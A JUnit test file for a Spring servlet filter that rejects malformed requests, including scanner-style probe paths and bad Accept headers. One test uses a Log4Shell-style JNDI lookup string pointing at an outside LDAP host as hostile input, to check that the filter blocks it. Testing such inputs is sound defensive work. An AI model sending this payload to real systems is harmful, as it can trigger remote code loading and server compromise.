package com.olimpiici.arena.web.filter;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

import java.io.IOException;
import java.util.concurrent.atomic.AtomicBoolean;

import javax.servlet.FilterChain;
import javax.servlet.http.HttpServletResponse;

import org.junit.Before;
import org.junit.Test;
import org.springframework.http.HttpHeaders;
import org.springframework.mock.web.MockHttpServletRequest;
import org.springframework.mock.web.MockHttpServletResponse;
import org.springframework.security.web.firewall.RequestRejectedException;

public class ClientRequestExceptionFilterTest {

    private ClientRequestExceptionFilter filter;

    @Before
    public void setup() {
        filter = new ClientRequestExceptionFilter();
    }

    @Test
    public void testValidRequestPassesThrough() throws Exception {
        MockHttpServletRequest request = new MockHttpServletRequest("GET", "/api/problems");
        request.addHeader(HttpHeaders.ACCEPT, "application/json, text/plain, */*");
        MockHttpServletResponse response = new MockHttpServletResponse();
        AtomicBoolean invoked = new AtomicBoolean(false);

        filter.doFilter(request, response, (req, res) -> invoked.set(true));

        assertThat(invoked.get()).isTrue();
        assertThat(response.getStatus()).isEqualTo(HttpServletResponse.SC_OK);
    }

    @Test
    public void testRequestRejectedExceptionReturns400() throws Exception {
        MockHttpServletRequest request = new MockHttpServletRequest("GET", "//wp-json/batch/v1");
        MockHttpServletResponse response = new MockHttpServletResponse();
        FilterChain chain = (req, res) -> {
            throw new RequestRejectedException("The request was rejected because the URL was not normalized.");
        };

        filter.doFilter(request, response, chain);

        assertThat(response.getStatus()).isEqualTo(HttpServletResponse.SC_BAD_REQUEST);
    }

    @Test
    public void testInvalidAcceptHeaderReturns406WithoutInvokingChain() throws Exception {
        MockHttpServletRequest request = new MockHttpServletRequest("GET", "/");
        request.addHeader(HttpHeaders.ACCEPT, "${jndi:ldap://example.com/a}");
        MockHttpServletResponse response = new MockHttpServletResponse();
        AtomicBoolean invoked = new AtomicBoolean(false);

        filter.doFilter(request, response, (req, res) -> invoked.set(true));

        assertThat(invoked.get()).isFalse();
        assertThat(response.getStatus()).isEqualTo(HttpServletResponse.SC_NOT_ACCEPTABLE);
    }

    @Test
    public void testInvalidAcceptHeaderYamlReturns406() throws Exception {
        MockHttpServletRequest request = new MockHttpServletRequest("GET", "/");
        request.addHeader(HttpHeaders.ACCEPT, "yaml");
        MockHttpServletResponse response = new MockHttpServletResponse();

        filter.doFilter(request, response, (req, res) -> {});

        assertThat(response.getStatus()).isEqualTo(HttpServletResponse.SC_NOT_ACCEPTABLE);
    }

    @Test
    public void testUndertowMultipartDisconnectReturns400() throws Exception {
        MockHttpServletRequest request = new MockHttpServletRequest("POST", "/RSC/test.txt");
        MockHttpServletResponse response = new MockHttpServletResponse();
        FilterChain chain = (req, res) -> {
            throw new RuntimeException(new IOException("UT000036: Connection terminated parsing multipart data"));
        };

        filter.doFilter(request, response, chain);

        assertThat(response.getStatus()).isEqualTo(HttpServletResponse.SC_BAD_REQUEST);
    }

    @Test
    public void testOtherRuntimeExceptionsStillPropagate() {
        MockHttpServletRequest request = new MockHttpServletRequest("GET", "/api/problems");
        MockHttpServletResponse response = new MockHttpServletResponse();
        FilterChain chain = (req, res) -> {
            throw new IllegalStateException("Unexpected bug");
        };

        assertThatThrownBy(() -> filter.doFilter(request, response, chain))
            .isInstanceOf(IllegalStateException.class)
            .hasMessage("Unexpected bug");
    }
}
